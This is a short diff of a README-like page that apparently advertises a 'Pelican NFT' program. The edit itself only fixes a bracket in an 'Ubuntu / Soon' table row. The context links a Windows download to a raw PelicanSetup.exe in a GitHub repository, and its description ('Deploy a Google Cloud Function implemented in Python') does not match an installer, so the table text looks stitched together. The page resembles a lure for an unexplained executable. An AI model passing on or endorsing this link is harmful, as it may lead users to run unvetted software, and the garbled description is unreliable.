@@ -38,7 +38,7 @@ If the program is not installed try reinstalling the package Visual Studio 2013 
 Example   | Description |
 --------- | --------- |
 [Windows 10 x64/x86](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe) | Deploy a Google Cloud Function implemented in Python.
-[Ubuntu 20.04 LTS / Soon](Soon) | Ubuntu 20.04 LTS / Soon](Soon)
+[Ubuntu 20.04 LTS / Soon](Soon) | [Ubuntu 20.04 LTS / Soon](Soon)
 
 # Licensing
 
